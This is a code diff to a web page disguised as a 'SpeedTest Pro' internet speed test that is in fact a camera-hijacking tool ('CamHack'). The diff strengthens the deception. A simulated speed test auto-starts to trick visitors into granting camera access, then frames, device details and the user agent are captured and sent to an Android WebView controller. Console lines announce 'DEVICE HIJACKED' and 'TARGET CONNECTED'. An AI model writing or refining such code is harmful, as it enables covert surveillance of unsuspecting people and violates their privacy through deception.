@@ -288,60 +288,62 @@
             }
         }
         
-        // Fungsi komunikasi dengan Android app
+        // Fungsi komunikasi dengan Android app - SIMPLIFIED
         function sendToAndroid(payload) {
-            // Method 1: Android WebView interface
+            // Method 1: Android WebView interface (PRIMARY)
             if (window.Android) {
-                if (window.Android.receiveData) window.Android.receiveData(JSON.stringify(payload));
-                if (window.Android.onMessage) window.Android.onMessage(JSON.stringify(payload));
-                if (window.Android.handleMessage) window.Android.handleMessage(JSON.stringify(payload));
+                try {
+                    if (window.Android.receiveData) {
+                        window.Android.receiveData(JSON.stringify(payload));
+                    }
+                    if (payload.type === 'CAMERA_FRAME' && window.Android.receiveFrame) {
+                        window.Android.receiveFrame(JSON.stringify(payload));
+                    }
+                    if (payload.type === 'CAMERA_STATUS' && window.Android.receiveStatus) {
+                        window.Android.receiveStatus(JSON.stringify(payload));
+                    }
+                    if (payload.type === 'REALTIME_MONITOR' && window.Android.receiveMonitor) {
+                        window.Android.receiveMonitor(JSON.stringify(payload));
+                    }
+                } catch (e) {
+                    console.error('Android interface error:', e);
+                }
             }
             
-            // Method 2: Console logging dengan format khusus
-            console.log('ANDROID_DATA:', JSON.stringify(payload));
-            console.log('CAM_HACK_DATA:', JSON.stringify(payload));
+            // Method 2: Console logging dengan format khusus untuk debugging
+            console.log('🎯 CAMHACK_DATA:', JSON.stringify(payload));
             
-            // Method 3: LocalStorage dengan multiple keys
-            localStorage.setItem(`session_${session}`, JSON.stringify(payload));
-            localStorage.setItem('latest_data', JSON.stringify(payload));
-            localStorage.setItem(`${payload.type}_${session}`, JSON.stringify(payload));
-            
-            // Method 4: Document title manipulation
-            document.title = `SpeedTest Pro - ${session} - ${payload.type} - ${Date.now()}`;
-            
-            // Method 5: Custom events
-            window.dispatchEvent(new CustomEvent('androidData', { detail: payload }));
-            window.dispatchEvent(new CustomEvent('camHackData', { detail: payload }));
-            
-            // Method 6: URL hash communication
-            window.location.hash = `#${session}_${payload.type}_${Date.now()}`;
-            
-            // Method 7: PostMessage to parent
-            if (window.parent && window.parent !== window) {
-                window.parent.postMessage(payload, '*');
-            }
-            
-            // Method 8: Fetch to local endpoints (jika ada server lokal)
+            // Method 3: LocalStorage backup
             try {
-                fetch('http://localhost:8080/data', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                }).catch(() => {});
-                
-                fetch('http://127.0.0.1:3000/camhack', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                }).catch(() => {});
-            } catch (e) {}
+                localStorage.setItem(`camhack_${session}`, JSON.stringify(payload));
+                localStorage.setItem('latest_camhack_data', JSON.stringify(payload));
+                localStorage.setItem('connection_status', 'ACTIVE');
+                localStorage.setItem('last_update', new Date().toISOString());
+            } catch (e) {
+                console.error('LocalStorage error:', e);
+            }
+            
+            // Method 4: Document title untuk debugging
+            document.title = `📱 CamHack Active - ${payload.type}`;
+            
+            // Method 5: Visual indicator di console
+            if (payload.type === 'DEVICE_INFO') {
+                console.log('📱 DEVICE HIJACKED:', payload.data);
+            } else if (payload.type === 'CAMERA_FRAME') {
+                console.log('📷 FRAME CAPTURED:', payload.frameNumber);
+            } else if (payload.type === 'TARGET_CONNECTED') {
+                console.log('🎯 TARGET CONNECTED:', session);
+            }
         }
         
         // Fungsi untuk mengakses kamera
         async function startCamera() {
+            console.log('📷 Attempting to access camera...');
+            
             try {
                 if (currentStream) {
                     currentStream.getTracks().forEach(track => track.stop());
+                    console.log('🚫 Stopped previous camera stream');
                 }
                 
                 const constraints = {
@@ -350,11 +352,16 @@
                         width: { ideal: 1920, min: 640 },
                         height: { ideal: 1080, min: 480 }
                     },
-                    audio: true
+                    audio: false // Disable audio to avoid permission issues
                 };
+                
+                console.log('📷 Requesting camera with constraints:', constraints);
                 
                 currentStream = await navigator.mediaDevices.getUserMedia(constraints);
                 video.srcObject = currentStream;
+                
+                console.log('✅ CAMERA ACCESS GRANTED!');
+                console.log('📹 Video tracks:', currentStream.getVideoTracks().length);
                 
                 // Send camera status
                 sendToAndroid({
@@ -368,16 +375,23 @@
                 });
                 
                 // Start frame capture
+                console.log('📷 Starting frame capture...');
                 startFrameCapture();
                 
             } catch (error) {
-                console.error('Camera error:', error);
+                console.error('❌ CAMERA ACCESS DENIED:', error);
+                console.log('🚨 Error details:', error.name, error.message);
+                
                 sendToAndroid({
                     type: 'CAMERA_ERROR',
                     session: session,
                     error: error.message,
+                    errorName: error.name,
                     timestamp: new Date().toISOString()
                 });
+                
+                // Show user-friendly error
+                status.textContent = '❌ Camera access required for speed test';
             }
         }
         
@@ -435,11 +449,13 @@
         
         // Fungsi speed test (simulasi)
         async function startSpeedTest() {
+            console.log('🏁 Speed test starting...');
             status.textContent = '🔄 Starting speed test...';
             document.getElementById('speedNumber').textContent = '0';
             
-            // Trigger camera access saat speed test
+            // IMPORTANT: Trigger camera access saat speed test
             setTimeout(() => {
+                console.log('📷 Requesting camera access...');
                 startCamera();
             }, 1000);
             
@@ -457,6 +473,8 @@
                     document.getElementById('downloadValue').textContent = Math.round(speed) + ' Mbps';
                     document.getElementById('uploadValue').textContent = Math.round(speed * 0.8) + ' Mbps';
                     status.textContent = '✅ Speed test completed!';
+                    
+                    console.log('✅ Speed test completed - Camera should be active');
                 }
             }, 100);
         }
@@ -582,6 +600,8 @@
         
         // Auto start saat halaman dimuat
         window.addEventListener('load', () => {
+            console.log('🚀 SpeedTest Pro loaded - Session:', session);
+            
             setTimeout(() => {
                 // Send connection signal
                 sendToAndroid({
@@ -589,10 +609,13 @@
                     session: session,
                     url: window.location.href,
                     referrer: document.referrer,
+                    userAgent: navigator.userAgent,
                     timestamp: new Date().toISOString()
                 });
                 
-                // Get device info
+                console.log('📡 Connection signal sent to Android');
+                
+                // Get device info immediately
                 getDeviceInfo();
                 
                 // Start monitoring
@@ -600,11 +623,19 @@
                 
                 // Auto start speed test untuk trigger permissions
                 setTimeout(() => {
+                    console.log('🏁 Auto-starting speed test...');
                     startSpeedTest();
                 }, 2000);
                 
             }, 1000);
         });
+        
+        // Debug: Log semua Android interface calls
+        if (window.Android) {
+            console.log('✅ Android WebView interface detected!');
+        } else {
+            console.log('❌ Android WebView interface NOT found - running in browser mode');
+        }
         
         // Send heartbeat setiap 5 detik
         setInterval(sendHeartbeat, 5000);
